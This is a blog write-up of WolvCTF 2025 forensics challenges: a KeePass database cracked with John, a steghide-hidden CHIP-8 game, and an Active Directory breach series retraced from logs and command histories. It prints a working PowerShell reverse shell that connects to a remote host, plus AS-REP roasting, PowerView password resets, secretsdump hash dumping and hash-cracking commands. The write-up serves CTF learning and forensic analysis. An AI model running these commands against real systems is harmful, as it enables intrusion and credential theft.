---
title: "WolvCTF2025"
description: "Migrated from Astro"
icon: "article"
date: "2025-03-24"
lastmod: "2025-03-24"
draft: false
toc: true
weight: 999
---

Didn’t really got to spend much time in this one, but back to have fun doing write-ups. Played this last year and placed at `225`, this time it was `117`, could’ve done so much better but no complains. Let’s quickie the forensics first. 

## Forensics

### **Passwords**

Author: `dree`

I heard you're a hacker. Can you help me get my passwords back?

Given: `Database.kdbx`

The moment I saw this challenge, I was laughing, I made a similar challenge for a university CTF a while ago, it was kinda nostalgic. Well, we’ve been given this `Database.kdbx` file which is `Keepass DB`, so it let’s you export the passwords in the format, making it vulnerable to brute-force attacks.

```bash
file Database.kdbx
Database.kdbx: Keepass password database 2.x KDBX
```

Now, we present these to `keepass2john` to format it in a manner that $John the Ripper$ understands. On that note, there are lot of other interesting modules in John that remains undiscovered, there’s even a `bitcoin2john` in there!

```bash
keepass2john Database.kdbx > hash.txt
```

Up next, we can fire up John to finish up things, getting the master password as `goblue1`.

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
└─$ john hash.txt --show
Database:goblue1
```

Now, we can either install the GUI version of Keepass, or use `kpcli`, which is a CLI alternative.

{{< figure src="image.png" alt="image.png" >}}

Opening up the vault, we see a couple of tabs under the database, just browser until you find the flag.

{{< figure src="image%201.png" alt="image.png" >}}

Flag: `wctf{1_th0ught_1t_w4s_s3cur3?}`

### **Breakout**

Author: `Sudojacob`

Something fishy about that photo... What could be hidden in this game?

Given: `breakout.jpg`

This one was pretty darn interesting to solve, props to the author for coming up with a unique idea, cool stuff. We’ve been given a `jpg` file, amongst the first things to try is `steghide`.

```bash
└─$ steghide extract -sf breakout.jpg
Enter passphrase:
wrote extracted data to "breakout.ch8".
```

<aside>
💡

**`.ch8` files** are **CHIP-8 ROMs**, which contain raw binary instructions for the **CHIP-8 virtual machine**. CHIP-8 is a simple interpreted language designed in the 1970s to run on early microcomputers and is now commonly used for learning about emulation.

</aside>

Now, I was looking at ways to emulate this file, and came across this GitHub repository.

[https://github.com/wernsey/chip8](https://github.com/wernsey/chip8)

Build the project with `make` and off you go.

{{< figure src="image%202.png" alt="image.png" >}}

Upon finishing the level, the flag gets displayed.

{{< figure src="image%203.png" alt="image.png" >}}

Flag: `WCTF{GAME_OVER_VMASBKLTNUFMGS}`

### **Active 1: Domain Access**

**Author: `dree`**

Oh no! Our beloved `wolvctf.corp` domain has been infiltrated! How did they manage to break into our domain controller? Please figure out how they got access into the domain controller box, how a shell was achieved, and how a domain account was obtained.

We have provided just the user accounts because the attacker did not cover their tracks very well.

`Users_Backup.zip`'s password is `wolvctf`

`sha256sum:709b595d63ac9660b9c67de357337ee55ffd6658412b8c5c27b35efc05617893`

*Flag is split up into 3 parts.*

[https://drive.google.com/drive/folders/11MzaiPYvosPSYlKzqqAVX_muiv5p4yQA?usp=sharing](https://drive.google.com/drive/folders/11MzaiPYvosPSYlKzqqAVX_muiv5p4yQA?usp=sharing)

Another pretty interesting series of challenges, where we have active-directory[AD] forensics. Given a `zip` file, extract it with the password in the description, and we have a collection of user directories in windows. In this challenge, we are to figure out how the attacker got access to the domain controller box, how shell was achieved, and how a domain account was obtained, and the flag is split into 3 parts. As for the first part, looking at the users, we see `mssql_service`, which is supposedly a service but the question is why does it have user directories to itself? **Service accounts** normally don’t have user directories, unless they were used interactively, which is a red flag.

```bash
Administrator  dan      desktop.ini  frank  james    john           patrick  Public
chris          Default  emily        jake   jessica  mssql_service  peter    renee
```

Now, we can proceed to look at `MySQL` logs for the service, which can be seen at `mssql_service/MSSQL13.SQLEXPRESS/MSSQL/Log/ERRORLOG`, looking at the logs, we see the first part of the flag in characters of incorrect login attempts.

```bash
2025-03-18 19:51:17.00 Logon       Login failed for user 'this'. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
2025-03-18 19:51:17.85 Logon       Error: 18456, Severity: 14, State: 5.
2025-03-18 19:51:17.85 Logon       Login failed for user 'is'. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
2025-03-18 19:51:18.43 Logon       Error: 18456, Severity: 14, State: 5.
2025-03-18 19:51:18.43 Logon       Login failed for user 'the'. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
2025-03-18 19:51:19.05 Logon       Error: 18456, Severity: 14, State: 5.
2025-03-18 19:51:19.05 Logon       Login failed for user 'first'. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
2025-03-18 19:51:19.69 Logon       Error: 18456, Severity: 14, State: 5.
2025-03-18 19:51:19.69 Logon       Login failed for user 'part'. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
2025-03-18 19:51:20.31 Logon       Error: 18456, Severity: 14, State: 5.
2025-03-18 19:51:20.31 Logon       Login failed for user 'w'. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
2025-03-18 19:51:20.86 Logon       Error: 18456, Severity: 14, State: 5.
2025-03-18 19:51:20.86 Logon       Login failed for user 'c'. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
2025-03-18 19:51:21.68 Logon       Error: 18456, Severity: 14, State: 5.
2025-03-18 19:51:21.68 Logon       Login failed for user 't'. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
2025-03-18 19:51:22.30 Logon       Error: 18456, Severity: 14, State: 5.
2025-03-18 19:51:22.30 Logon       Login failed for user 'f'. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
2025-03-18 19:51:23.12 Logon       Error: 18456, Severity: 14, State: 5.
2025-03-18 19:51:23.12 Logon       Login failed for user '{'. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
2025-03-18 19:51:23.96 Logon       Error: 18456, Severity: 14, State: 5.
2025-03-18 19:51:23.96 Logon       Login failed for user 'd'. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
2025-03-18 19:51:24.56 Logon       Error: 18456, Severity: 14, State: 5.
2025-03-18 19:51:24.56 Logon       Login failed for user '0'. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
2025-03-18 19:51:25.22 Logon       Error: 18456, Severity: 14, State: 5.
2025-03-18 19:51:25.22 Logon       Login failed for user 'n'. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
2025-03-18 19:51:25.82 Logon       Error: 18456, Severity: 14, State: 5.
2025-03-18 19:51:25.82 Logon       Login failed for user 't'. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
2025-03-18 19:51:26.49 Logon       Error: 18456, Severity: 14, State: 5.
2025-03-18 19:51:26.49 Logon       Login failed for user '_'. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
2025-03-18 19:51:27.21 Logon       Error: 18456, Severity: 14, State: 5.
2025-03-18 19:51:27.21 Logon       Login failed for user '3'. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
2025-03-18 19:51:27.93 Logon       Error: 18456, Severity: 14, State: 5.
2025-03-18 19:51:27.93 Logon       Login failed for user 'n'. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
2025-03-18 19:51:28.60 Logon       Error: 18456, Severity: 14, State: 5.
2025-03-18 19:51:28.60 Logon       Login failed for user '4'. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
2025-03-18 19:51:29.11 Logon       Error: 18456, Severity: 14, State: 5.
2025-03-18 19:51:29.11 Logon       Login failed for user 'b'. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
2025-03-18 19:51:29.64 Logon       Error: 18456, Severity: 14, State: 5.
2025-03-18 19:51:29.64 Logon       Login failed for user 'l'. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
2025-03-18 19:51:30.29 Logon       Error: 18456, Severity: 14, State: 5.
2025-03-18 19:51:30.29 Logon       Login failed for user '3'. Reason: Could not find a login matching the name provided. [CLIENT: 192.168.231.1]
```

Part 1: `wctf{d0nt_3n4bl3`

For the second part, we need to figure out how the attacker got shell access, for this we notice a `winPEASOutput.txt` at `Users/Public/Documents`, which is always a good place to check.

```bash
P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%c% Processes Information `%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%P%
T%P%P%P%P%P%P%P%P%P%P%c% Interesting Processes -non Microsoft-
Z% Check if any interesting processes for memory dump or if you could overwrite some binary running https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#running-processes
conhost(7856)[C:\Windows\system32\conhost.exe] -- POwn: MSSQL$SQLEXPRESS
Command Line: \??\C:\Windows\system32\conhost.exe 0x4
=================================================================================================
cmd(1620)[C:\Windows\system32\cmd.exe] -- POwn: MSSQL$SQLEXPRESS
Command Line: "C:\Windows\system32\cmd.exe" /c powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAOAA3AC4AMQAyADgAIgAsADEANAAzADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAZQBuAGMAbwBkAGUAZABfAGYAbABhAGcAcAB0ADIAIAA9ACAAIgBYADMAaABRAFgAMgBOAHQAWgBIAE4AbwBNAHoARQB4AFgAMwBjAHgAZABHAGgAZgBaAEQATgBtAFkAWABWAHMAZABGADkAagBjAGoATgBrAGMAMQA4AHcAYwBsADgAPQBzACIAOwAkAGYAbABhAGcAcAB0ADIAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAZQBuAGMAbwBkAGUAZABfAGYAbABhAGcAcAB0ADIAKQApADsAVwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAkAGYAbABhAGcAcAB0ADIAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
=================================================================================================
winPEASx64(8144)[C:\Users\Public\Documents\winPEASx64.exe] -- POwn: MSSQL$SQLEXPRESS -- isDotNet
Permissions: MSSQL$SQLEXPRESS [AllAccess], Service [WriteData/CreateFiles]
Possible DLL Hijacking folder: C:\Users\Public\Documents (Service [WriteData/CreateFiles])
Command Line: "C:\Users\Public\Documents\winPEASx64.exe" all
=================================================================================================
```

Here we see that command line execution of a Base64-encoded PowerShell script, indicating an attacker spawned a shell through MSSQL, decoding the `base64`, we get the second part of the flag.

```bash
$client = New-Object System.Net.Sockets.TCPClient("192.168.187.128",1433);
$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + "PS " + (pwd).Path + "> ";
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$encoded_flagpt2 = "X3hQX2NtZHNoMzExX3cxdGhfZDNmYXVsdF9jcjNkc18wcl8=s";
$flagpt2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded_flagpt2));
Write-Output $flagpt2;
$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
$client.Close()
```

Part 2: `xP_cmdsh311_w1th_d3fault_cr3ds_0r_`

Onto the third part, where we need to find how domain account was obtained, we find another interesting piece of information in the same `winPEASOutput.txt` file.

```bash
T%P%P%P%P%P%P%P%P%P%P%c% Looking for AutoLogon credentials
Some AutoLogon credentials were found
DefaultDomainName             :  WOLVCTF
DefaultUserName               :  WOLVCTF\Dan
DefaultPassword               :  DansSuperCoolPassw0rd!!
AltDefaultUserName            :  loot-in-hex:656e61626c335f347574306c6f67306e5f306b3f3f213f7d
```

```bash
└─$ echo "656e61626c335f347574306c6f67306e5f306b3f3f213f7d" | xxd -p -r
enabl3_4ut0log0n_0k??!?}
```

Flag: `wctf{d0nt_3n4bl3xP_cmdsh311_w1th_d3fault_cr3ds_0r_enabl3_4ut0log0n_0k??!?}`

### **Active 2: Lateral Movement**

Author: `dree`

The attacker moved laterally throughout our domain. I'm hearing reports from other members of `wolvctf.corp` that 3 lower level accounts were compromised (excluding the 2 higher level compromised accounts). Figure out which ones these are, and follow the attacker's steps to collect the flag.

As for the this challenge, we need to figure out how the attacker laterally moved through the domain. I’ll be pretty brief with the explanations as need to leave for university.

Over at `Users/dan/Desktop`, we see `asreproast.output` where we get the first part of the flag.

```bash
└─$ echo "d2N0Znthc3IzcHIwNHN0M2Q/Xw==" | base64 -d
wctf{asr3pr04st3d?_
```

We also extracted the **AS-REP Roasting** hash for the user emily of wolvctf.corp, which we can crack with John.

```bash
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asreproast.hash
└─$ john asreproast.hash --show
$krb5asrep$emily@wolvctf.corp:youdontknowmypasswordhaha

1 password hash cracked, 0 left
```

Emily’s password: `youdontknowmypasswordhaha`. Then we move on to the user Emily’s directory.

`Users/emily/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt`

```bash
cd C:\Users\emily
tree /f /a > tree.txt
type tree.txt
cd Documents
dir
type README
echo "James asked me to keep his password secret, so I made sure to take extra precautions." >> C:\Users\Public\loot.txt
echo "Note to self: Password for the zip is same as mine, with 777 at the end" >> C:\Users\Public\loot.txt
del README
cp .\important.7z C:\Users\Public
del C:\Users\Public\loot.txt
del C:\Users\Public\important.7z
runas /User:wolvctf\james cmd
```

So using the password `youdontknowmypasswordhaha777` on the `important.7z`, we get 3 images, and doing basic forensics on them reveals another part of the flag, `binwalk` on the `car.jpg`.

```bash
└─$ binwalk car.jpeg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
9296          0x2450          JPEG image data, JFIF standard 1.01
```

So `binwalk` fails here, so you can use `dd` or `foremost` to extract the image.

```bash
dd if=car.jpeg bs=1 skip=9296 of=part2.jpg
```

{{< figure src="image%204.png" alt="image.png" >}}

Part 2: `sh0uldv3_3nabl3d_s0me_k3rb3r0s_pr34uth_4nd_`

As for the third part of the flag, we find it in the `ConsoleHost_history.txt` under James.

```bash
cd C:\Users\Public\Documents
mv .\PowerView.txt .\PowerView.ps1
powershell -ep bypass
Import-Module .\PowerView.ps1
Find-DomainProcess
$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force`
Set-DomainUserPassword -Identity 'emily' -AccountPassword $NewPassword
$NewPassword = ConvertTo-SecureString 'd0nt_us3_4ll3xtendedr1ghts}' -AsPlainText -Force`
Set-DomainUserPassword -Identity 'patrick' -AccountPassword $NewPassword
runas /User:wolvctf\patrick cmd
```

Flag: `wctf{asr3pr04st3d?_sh0uldv3_3nabl3d_s0me_k3rb3r0s_pr34uth_4nd_d0nt_us3_4ll3xtendedr1ghts}`

### **Active 3: Domain Admin**

Author: `dree`

Now, it's time to figure out how this attacker obtained administrator access on our domain! To prove you have retraced the attacker's steps completely, submit the domain admin's password as the flag. It's already in the flag format.

Enumerating for PowerShell history files, we see dan also has one.

```bash
cd Desktop
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\dan\Documents -OutputPrefix "wolvctf_audit"
powershell -ep bypass
.\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\dan\Documents -OutputPrefix "wolvctf_audit"
Import-Module \SharpHound.ps1
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\dan\Documents -OutputPrefix "wolvctf_audit"
.\Rubeus.exe asreproast /user:emily /domain:wolvctf.corp /dc:DC01.wolvctf.corp > asreproast.output
 .\Rubeus.exe kerberoast > kerberoast.output
runas /User:wolvctf\emily cmd`
```

Under `Users/dan/Documents`, we see `wolvctf_audit_20250318195834_BloodHound.zip`, which is the zip output file from `Bloodhound` .

<aside>
💡

 Bloodhound is a tool used for Active Directory (AD) reconnaissance and attack path analysis.

</aside>

Unzipping it and looking at it, we hit something under the `wolvctf_audit_20250318195834_groups.json` file.

```bash
{
            "Properties": {
                "domain": "WOLVCTF.CORP",
                "name": "DOMAIN ADMINS@WOLVCTF.CORP",
                "distinguishedname": "CN=DOMAIN ADMINS,CN=USERS,DC=WOLVCTF,DC=CORP",
                "domainsid": "S-1-5-21-240583078-1008484028-2547278744",
                "samaccountname": "Domain Admins",
                "isaclprotected": true,
                "description": "Members who are part of this group have passwords w then a c then a t and an f, curly bracket left, 'bloodhound_is_cool_' (but all the 'o's are '0's), then a city in all lowercase appended by 3 numbers (secret only you know),  right curly bracket",
                "whencreated": 1742226466,
                "admincount": true
            }
```

Secret content indeed, but actually one of those times, where the challenge begins with a bang but ends with a dud.

“Members who are part of this group have passwords w then a c then a t and an f, curly bracket left, 'bloodhound_is_cool_' (but all the 'o's are '0's), then a city in all lowercase appended by 3 numbers (secret only you know),  right curly bracket”.

Now, we write a script to generate a wordlist based on the description. Import the cities list somewhere from the internet. Personally I used the following one.

[Major cities of the world](https://datahub.io/core/world-cities)

Had to format and filter a couple of things as it was in JSON, and had other stuff too.

```bash
cat cities.json | grep -o '"name": "[^"]*"' | cut -d'"' -f4 | tr '[:upper:]' '[:lower:]' | grep -a -P "^[a-z0-9]*$" > passwords.txt
```

Finally we brought it down to `18k` cities. Now for the scripting part.

```bash
with open("list.txt", "r") as f:
    cities = [line.strip().lower() for line in f]

with open("passwords.txt", "w") as f:
    for city in cities:
        for i in range(1000):
            f.write("{% raw %}\n") # bypass jekyll liquid syntax error
            f.write(f"wctf{{bl00dh0und_is_c00l_{city}{i:03d}}}\n")
            f.write("{% endraw %}\n")
```

Also, we can find the `ntds.dit` and `system.hive` files under `Users/jake/Downloads`. Dumping it using `Impacket Secretsdump`.

```bash
└─$ impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x32032d8f6ff9102e4202d192c152e02a
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: a802330d6d1dca4a57a459990af5e50e
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1b921e44ea5dfd940c004044d4ef4cae:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:b60be13c1c27a48e5c5afc10792afeab:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7f27814ee1fea90dc7495b265207db9d:::
mssql_service:2102:aad3b435b51404eeaad3b435b51404ee:6092ca0e60d24f30d848a5def59d4753:::
wolvctf.corp\james:4101:aad3b435b51404eeaad3b435b51404ee:4c20abe87d36b9ad715fd5671545abb5:::
wolvctf.corp\emily:4102:aad3b435b51404eeaad3b435b51404ee:5c7a26ae4c40018fa1660cc2f1d82269:::
wolvctf.corp\john:4103:aad3b435b51404eeaad3b435b51404ee:d24c1456aefeab3eb911c8015b9f6ce4:::
wolvctf.corp\patrick:4104:aad3b435b51404eeaad3b435b51404ee:0311f96ce47c5cc21529fcc8375f9c2e:::
wolvctf.corp\katherine:4105:aad3b435b51404eeaad3b435b51404ee:89218e0b151209e9d4fa0768ea72c70d:::
wolvctf.corp\Amy:4106:aad3b435b51404eeaad3b435b51404ee:4aa4474c2886f6a796bd75eebe5ebf01:::
wolvctf.corp\jessica:4107:aad3b435b51404eeaad3b435b51404ee:8fcdcffba18f392df7aa291527290aff:::
wolvctf.corp\frank:4108:aad3b435b51404eeaad3b435b51404ee:b0212745c59fcf54f06ea501cd409ff5:::
wolvctf.corp\chris:4109:aad3b435b51404eeaad3b435b51404ee:253cfc1375d39308ab1bb935b44e2010:::
wolvctf.corp\renee:4110:aad3b435b51404eeaad3b435b51404ee:9b5109ef6dbc8086ed36a90c20aa1d48:::
wolvctf.corp\peter:4111:aad3b435b51404eeaad3b435b51404ee:4f3cde005948d4e4fb232c35014ccafb:::
wolvctf.corp\dan:4112:aad3b435b51404eeaad3b435b51404ee:e9d959da74f5c7590a80d635b36705a6:::
wolvctf.corp\jake:4113:aad3b435b51404eeaad3b435b51404ee:cc4f0a96d3c0ce71b664e314b14ecd7e:::
```

Promptly go ahead and try cracking the passwords. One things to note is that, we are after Emily’s password since we find out that Emily is a domain administrator, from the bloodhound output files.

Running the above script generates a wordlist that we can import in John to crack the hash. Turns out it is `Votuporanga`, a city in Brazil. Wild. 

```bash
└─$ hashcat -m 1000 -a 0 hash.txt passwords.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i7-8650U CPU @ 1.90GHz, 2886/5836 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 2 MB

Dictionary cache built:
* Filename..: passwords.txt
* Passwords.: 18637000
* Bytes.....: 679175000
* Keyspace..: 18637000
* Runtime...: 6 secs

8fcdcffba18f392df7aa291527290aff:wctf{bl00dh0und_is_c00l_votuporanga985}

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 8fcdcffba18f392df7aa291527290aff
Time.Started.....: Mon Mar 24 13:47:42 2025 (16 secs)
Time.Estimated...: Mon Mar 24 13:47:58 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (passwords.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1667.6 kH/s (0.39ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 17293312/18637000 (92.79%)
Rejected.........: 0/17293312 (0.00%)
Restore.Point....: 17289216/18637000 (92.77%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: wctf{bl00dh0und_is_c00l_vostryakovo216} -> wctf{bl00dh0und_is_c00l_vovchansk311}

Started: Mon Mar 24 13:47:34 2025
Stopped: Mon Mar 24 13:48:00 2025
```

Whew, that cracking was tedious but pretty satisfying to do!

Flag:`wctf{bl00dh0und_is_c00l_votuporanga985}`

Here’s a video provided by the author that shows how the attacker infiltrated the system. Props to him was putting in the effort into creating the challenge. 

[Active WolvCTF Attacker Pov](https://www.youtube.com/watch?v=IEn8gESZ00g)

By the way, we all face this issue where the Infrastructure is taken down, but we need to reference the site for descriptions and whatnot, and you can do this with `Wayback Machine`, except that is always takes you to the login page of the site as it hits 302, someone had done the same on `22nd`.

[WolvCTF 2025](https://web.archive.org/web/20250322112918/http://wolvctf.io/login?next=%2Fchallenges%3F)

No good. In comes `Webrecorder`, which was renamed to `Conifer`, provides just that, which let’s us view that site as though it was live. Check it out. Just one downside is that you have to login and have to manually simulate the process of recording. 

[Conifer](https://conifer.rhizome.org/Abu/wolvctf/20250323143832/http://wolvctf.io/challenges)
